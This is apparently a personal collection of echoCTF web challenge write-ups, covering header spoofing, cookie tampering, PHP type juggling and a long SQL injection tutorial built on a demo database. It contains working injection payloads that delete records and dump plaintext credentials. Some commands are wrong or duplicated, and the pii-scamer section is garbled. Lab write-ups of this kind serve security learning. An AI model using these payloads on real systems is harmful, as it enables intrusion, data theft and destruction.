#CTF #echoCTF
# bender
The flags are hidden in the robots.txt and /nogooglebot/ <- direction given in robots.txt

# headoffice
Consist in get the headers of a http website, we can do it with this command

```bash
curl -I target
```

Will find the flag there.

# hostel
We got two ways to find the flag, with burpsuite changing the **host** to ETSCTF or with curl, with the parameter -H.

```bash
curl -H "Host: ETSCTF" target
```

# idiotr
When we go to the webpage we can see that in url is set an id whith the number two, if we change it with one we'll get the flag

# argonaut
My way to solve it is doing fuzzing

```bash
gobuser -w gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u target -t 20
```

Gobuster will find a directory called db, there will be all flags.

# getip
Consist in bypass the security brech spoofing our ip with burpsuite or curl.

```bash
curl --header "X-Forwarded-For: localhost" http://10.0.41.6:1337/
```

# postoffice
To find the flag just need to make a post request, we can do it with curl that way:

```bash
curl --header "X-Forwarded-For: localhost" http://10.0.41.6:1337/
 ```

# redirector
Tracking redirections we can make the flag, to track it we can use get,and to get just the redirections can grep with location.

```bash
wget target 2>&1 | grep location
```

![[Pasted image 20241004213252.png]]

The flag is ETSCTF_020cd4b73e07cfc4b7148af83de41508.

# theloginofshame
Its based on cookie tempering, we can change the cookies of our user to admin in the browser this way:

![[Pasted image 20241004214258.png]]

Change guest to admin and will get the flag

![[Pasted image 20241004214344.png]]

# 6letter-juggler
To bypass this one we need to change the type of data in password and login, we can known that is running a php behind due to the url syntax, so, if instead of just login and password put a '[]' we can bypass it.

![[Pasted image 20241004232037.png]]
https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09

# jugglin-flea
Output showed in the website:

```php
<?php
if (empty($_POST)) {
    highlight_file(__FILE__);
    exit;
}

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

$flag = require_once('../flag.php');
$randno = intval(rand() % 10);
$mypassword = $randno . md5(time());

try {
    $entityBody = file_get_contents('php://input');
    $auth = json_decode($entityBody);

    if ($auth === null) {
        throw new \Exception('Authenticate first with body {"username":"yourusername","password":"yourpassword"}', 1);
    }

    if (!empty($auth->password) && !is_array($auth->password) && $auth->password == $mypassword) {
        echo json_encode(["success" => ['message' => 'Correct password, here is your flag ' . $flag]]);
        exit;
    } else {
        throw new \Exception("Password authentication failed...", 1);
    }
} catch (\Exception $e) {
    echo json_encode(['error' => ['message' => $e->getMessage()]]);
}
?>
```

To solve this flag we have to firstly bypass the first lines of the code showed in the page, we do it with curl setting up a post request with both headers, just like this:

```bash
curl -i "Access-Control-Allow-Origin: *" "Content-Type: Application/json"
```

This bypass the first lines cause now the post isnt empty, now to get the flag we need to bypass the authenticate request, the name of the challenge is a hint, we have to juggl the php code changing the value of the password from string to an integer, the entire command would look like this:

```bash
curl -i "Access-Control-Allow-Origin: *" "Content-Type: Application/json" -d '{"username":"yourusername","password":1}' -X POST http://10.0.41.14:1337
```

As we can see, the password value is not an string, instead of it we set it up as an integer, if we send this petition to the website a number of times we will bypass it surely:

![[Pasted image 20241008005235.png]]

# lightswitch
To solve this challenge we can intercept the trafic via burpsuite, it show us this request:

```
POST /lightswitch.php HTTP/1.1
Host: 10.0.41.11:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 31
Origin: http://10.0.41.11:1337
Connection: keep-alive
Referer: http://10.0.41.11:1337/
Priority: u=0

username=invalid&time=0&state=off
```

And will receive this pop up in the website:

![[Pasted image 20241008011358.png]]

We can see that the username in the petition is literally "invalid" so we can try modifying this to the usual usernames, as administrator, root or admin.
When try admin as username we can see that now just are displaying incorrect time so we can deduce that the username admin is the correct one, now just have to change the time value to the current in the server, as we can see at this time is 07, so if we set both values "admin" & "07" we will receive the flag:

![[Pasted image 20241008011825.png]]

![[Pasted image 20241008011802.png]]


# netz-arbeiter
We can see the flag in the inspection tool of the browser:

![[Pasted image 20241008012510.png]]

# pii-scamer
flag 1:

````sqr
to get flag 1 we need to change our userId to ``0``

```text
	#cookie
	
````

%7B%22fullname%22%3A%22psw%22%2C%22user_id%22%3A0%7D

````julia
	#decoded value
	{"fullname":"psw","user_id":0}
```
````

flag 2:

```pgsql
I manage to access the admin.php by adding a new 
```

cookie named `` `admin ```

```routeros
<img src="https://i.imgur.com/IGI05tA_d.webp">
you can find the flag in the last record (101) 
```

flag 3:

```livecodeserver
this one is a little bit tricky
first I found a way to delete a single record from 
```

commented tag.

```pgsql
my first attempt is to delete all records using 
```

wildcard character but it's not that easy.

```less
after a few minutes, I saw when I add a ``'`` after 
```

the record id SQL error shows up

````autohotkey
```text
	Warning: SQLite3::exec(): unrecognized 
````

token: "'1''" in /var/www/html/admin.php on line 40

````pgsql
```

now the only thing to do is craft a good SQL query 
````

to delete all records from the table and get the flag

````sql
```sql
	-- http://10.0.41.17:1337/admin.php?
````

delete=1' OR id LIKE '%25'%20 --

```sql
	-- server executes our SQL query like this
	DELETE FROM <tablename> WHERE id = '1' OR 
```

id LIKE '%' --'

````scheme
```
````

# squireli
## SQLi

This challenge is a basic introduction to SQL injection. The concept was made easy by this challenge providing a single attack vector. We don't have to go searching for a place to input our injection.

SQLi misuses a malformed SQL query hard-coded into the vulnerable program by taking advantage of unsanitized user input. The premise here is that we end the portion of the query that we cannot edit and append our own query to the end of it in order to manipulate a database, and its information, in ways that we want.

## SQL Basics

I created a minimal SQLite3 database to use for demonstration purposes. Let's have a look at one of the tables before moving forward.

```brainfuck
id  name                                                  balance  hidden
--  ----------------------------------------------------  -------  ------
1   databus                                               25000    0     
2   0xRar                                                 10000    0     
3   sirEgghead                                            500000   1     
4   i_don't_know_why_i'm_choosing_a_stupid_long_username  2        0     
```

As we can see here, we have a table with 4 **fields** and 4 **records**. **Fields** are SQL's way of saying columns, and **records** are SQL's way of saying rows. The data in an SQL table is addressed by its field name. Here, we have `id`, `name`, `balance`, and `hidden`.

In order to retrieve and maniplate the data from an SQL database, we send it commands called **queries**. A query can come in many forms, the most basic of them being a `SELECT` statement. `SELECT` is SQL's way of saying "Let me see _xyz_".

A `SELECT` statement has two basic requirements. **What** you are selecting and where it's coming `FROM`. Let's see it in action.

```pgsql
sqlite> SELECT * FROM bankinfo;
id  name                                                  balance  hidden
--  ----------------------------------------------------  -------  ------
1   databus                                               25000    0     
2   0xRar                                                 10000    0     
3   sirEgghead                                            500000   1     
4   i_don't_know_why_i'm_choosing_a_stupid_long_username  2        0     
```

Here we used the query `SELECT * FROM bankinfo`. We have provided the database terminal with the 3 basic elements of a `SELECT` query. The command, the what, and the table name. The wildcard `*` used is just saying to `SELECT` everything in the table `bankinfo` and show it to us.

What if we had 1000 records in this table? We wouldn't want all 1000 records displayed on our screen. We can append optional clauses to the end of our query in order to limit what is displayed. The clause we'd like to use here is `WHERE`. So if we only wanted to see the information about databus, we can append `WHERE id=1` or `WHERE name='databus'`. Let's give it a try.

```pgsql
sqlite> SELECT * FROM bankinfo WHERE name='databus';
id  name     balance  hidden
--  -------  -------  ------
1   databus  25000    0     
```

If we wanted to display all records that have a balance higher than 10000, we could do that in the same manner.

```pgsql
sqlite> SELECT * FROM bankinfo WHERE balance>10000;
id  name        balance  hidden
--  ----------  -------  ------
1   databus     25000    0     
3   sirEgghead  500000   1     
```

So what if we wanted to query certain fields? Just replace the wild card with what fields you want to see, separated by commas. So if I was only interested in how much money everyone had, I could do this very easily.

```pgsql
sqlite> SELECT name, balance FROM bankinfo;
name                                                  balance
----------------------------------------------------  -------
databus                                               25000  
0xRar                                                 10000  
sirEgghead                                            500000 
i_don't_know_why_i'm_choosing_a_stupid_long_username  2    
```

You can also continue to use optional clauses with this as well.

```pgsql
sqlite> SELECT name, balance FROM bankinfo WHERE balance>10000;
name        balance
----------  -------
databus     25000  
sirEgghead  500000 
```

Let's hop into a script that I made that loosely mimics what is going on in **Squireli** so that we can try to apply our knowledge to the challenge.

## Performing Injections

```gherkin
$ ./example.py

    ****************************************
    *     ______________________           *
    *    < please don't hack me >          *
    *     ----------------------           *
    *            \   ^__^                  *
    *             \  (oo)\_______          *
    *                (__)\       )\/\      *
    *                    ||----w |         *
    *                    ||     ||         *
    ****************************************
    

id   name                                       balance
1  | databus                                  | 25000  
2  | 0xRar                                    | 10000  
4  | i_don't_know_why_i'm_choosing_a_stupid_l | 2      
Selection:
```

Ok, so here we have something that looks a lot like what we see in **Squireli**. Let's compare what we know about the database behind it to what we're seeing here on the screen. We know in our bankinfo table that we had 4 fields and 4 records. Here in the terminal script, we're only seeing 3 fields and 3 records. Why is that?

Even if we didn't know anything about the backing database, we could assume that the terminal script is using a query that looks something like this: `SELECT id, name, balance FROM bankinfo WHERE hidden=false`. Looks just like what we were doing in our examples, but using different values.

Also assuming that we didn't know anything about the underlying database, if we look closely, we can see by the `id` field that a record is missing. Let's see if we can retrieve it by entering its number at the selection prompt.

```coq
Selection: 3
3  | sirEgghead                               | 500000 
```

Ok, so we're able to view even the records that are hidden by providing the id number. We can assume that the query behind this selection function looks like: `SELECT id, name, balance FROM bankinfo WHERE id=$userinput`. If the programmer did not sanitize the user input before providing it to the SQL query, we should be able to tack on some of our own statements. Let's test this by trying to retrieve multiple records. We can append another `WHERE` clause by using `OR`.

```coq
Selection: 3 OR id = 1
1  | databus                                  | 25000  
3  | sirEgghead                               | 500000 
```

So here we learned that our assumption about input sanitizing was true. We have a SQL injection vector, and we also know how the hard-coded query is formed. So we transformed the query into `SELECT id, name, balance FROM bankinfo WHERE id=3 OR id=1`. Now we should be able to hop around the database however we want.

Using `OR` here tells the database to `SELECT` records that have `id=3 OR id=1`. If we used `AND`, it would return no records because a record cannot contain both `id` 3 and `id` 1.

We now have one half of the critical info that we need in order to crack this thing - the query structure, and how to form our injections. Let's find out more about this database.

## Enumerating The Database

We know from our introductory section the name of the table, but in the challenge we don't. So let's move forward by finding out what all this database has to offer.

All SQL databases have a native table, a **master** table, that stores information about how all of the tables are structured. In SQLite3, the master table is called `sqlite_master`. The structure for `sqlite_master` is standardized, so we know what the this native table structure looks like by reading the [online documentation](https://www.sqlite.org/schematab.html).

The fields in `sqlite_master` are `type`, `name`, `tbl_name`, `rootpage`, and `sql`. The ones that really concern us are `tbl_name` and `sql`. `tbl_name` will give us the table names in the database, and `sql` will tell us the SQL query used to create that table. Which means it will contain the names of all the fields, or column names. Two vital pieces of information needed to properly perform SQLi.

So we could `SELECT tbl_name, sql FROM sqlite_master` and retrieve all of the information that we need in order to complete this challenge. So how do we do this when the `SELECT` statement is already formed? The answer is we `UNION` on another `SELECT` statement.

The `UNION` clause will take information from an additional `SELECT` statement, and append it to our existing results, as if they belong together. The catch with using `UNION` is that the amount of fields queried in both `SELECT` statements have to match.

In the case of our challenge, we're automatically retrieving 3 fields from the first `SELECT` statement, and that amount cannot be altered. So we need to make sure that we also have 3 fields in our `UNION`. We also can see that the length of each field is truncated so that it looks pretty on the screen, which makes `UNION`ing anything into the `id` field or the `balance` field useless. So what we'll do here is alias `NULL` as those fields so that they are just blank.

Our `UNION` clause will look like `UNION SELECT NULL as id, tbl_name, NULL as balance FROM sqlite_master`. Then we should be able to tack a list of table names onto our displayed results in the second column in the terminal. Just remember that we also need to complete our first `SELECT` statement as we have done before, so that it doesn't error. We'll just use `9` as our selection in the first statement so that we don't get any additional clutter.

```pgsql
Selection: 9 UNION SELECT NULL as id, tbl_name, NULL as balance FROM sqlite_master
   | bankinfo                                 |        
   | users                                    |        
```

Awesome! We can see that we have two tables in this database. We have already been viewing the data from `bankinfo`, but the `users` database looks really tasty! Perhaps we can steal some credentials!

In order to do that, we're going to need to enumerate the field names in this table, otherwise we won't know what to use in our `SELECT` statement. Remember that the table schema is stored in the `sql` field of `sqlite_master`. Let's craft a new statement to see what we can get. We'll use the `WHERE` clause in this one so that we're only returning info on the `users` table, and not the other table.

```pgsql
Selection: 9 UNION SELECT NULL as id, sql, NULL as balance FROM sqlite_master WHERE tbl_name='users'
   | CREATE TABLE users(id integer NOT NULL,  |        
```

Sweet, we can see that we structured our query correct. But the terminal clearly isn't printing everything contained in that record. It must be truncating the output in order to keep the screen formatted nice and pretty. So how do we get the truncated information?

The answer to this is retrieve a `SUBSTRING()` of what we already crafted. If we count the character space available in that column, we have room for 40 characters. So we'll start collecting data after character 40.

`SUBSTRING()` requires 3 arguments to work properly. The first is the field name. The second is where to start. The third is where to stop. Since the output is being truncated anyway, the third argument doesn't matter, as long as it is past where we want to stop. So in our case it would look like `SUBSTRING(sql, 40, 500)`. We simply take this statement and put it in place of where we selected the `sql` field. Nothing else from our previous statement should need to change. Let's try.

```pgsql
Selection: 9 UNION SELECT NULL as id, sql, NULL as balance FROM sqlite_master WHERE tbl_name='users'
   | CREATE TABLE users(id integer NOT NULL,  |        
   
Selection: 9 UNION SELECT NULL as id, SUBSTRING(sql, 40, 500), NULL as balance FROM sqlite_master WHERE tbl_name='users'
   |  username text NOT NULL, password text N |        
   
Selection: 9 UNION SELECT NULL as id, SUBSTRING(sql, 80, 500), NULL as balance FROM sqlite_master WHERE tbl_name='users'
   | OT NULL, ipaddress text NOT NULL, create |        

Selection: 9 UNION SELECT NULL as id, SUBSTRING(sql, 120, 500), NULL as balance FROM sqlite_master WHERE tbl_name='users'
   | d text NOT NULL, country text NOT NULL)  |
```

Perfect! It looks like we have now enumerated all fields in the `users` table. It contains `id`, `username`, `password`, `ipaddress`, `created`, and `country` fields. Let's get in here and see if we can drain this database dry!

## Breaking The Bank

The hard part is over. We have taken notes on all of the structure and can quickly craft statements to pwn this thing! We're going to start by enumerating all the users in this table. We'll also go ahead and include the user's id in our provided `id` field to help us with organizing.

```coq
Selection: 9 UNION SELECT id, username, NULL as balance FROM users     
1  | databus                                  |        
2  | 0xRar                                    |        
3  | Orgis                                    | 
```

Sweet, it looks like we have 3 users here. Let's steal their passwords. We'll continue to use the `id` field so that we know who they belong to.

```pgsql
Selection: 9 UNION SELECT id, password, NULL as balance FROM users
1  | just@password                            |        
2  | reallyfancypa$sw0rd                      |        
3  | ilikesammiches                           |        
```

Perfect. We now have all the usernames and passwords for this system. And they failed to encrypt them, so our life just got a whole lot easier. Plus we learned that **0rgis** likes sammiches. ;)

## Final Thoughts

So while I didn't show examples from **Squierli** in this write-up, I did provide you with all the knowledge necessary to defeat it. I also made it a little bit easier with a wider column than devious **databus** did, but now you know how to `SUBSTRING()` in order to get the results you need within a limited space.

Here we learned to keep an eye on what's hidden right in front of you by checking for id numbers that are not displayed. We also learned how to test if SQLi was possible on our target. And then we learned how to craft our own SQLi. Finally we learned how to enumerate everything in the database, even from tables that weren't intended on being accessed.

Just keep in mind that each brand of SQL database will have a different query structure and will also have a different master table. If you come across one of these, you will need to check the documentation for that particular flavor and make adjustments to your injection, but will still use the knowledge that you gained here.

>This is not a write up writen by r0lk444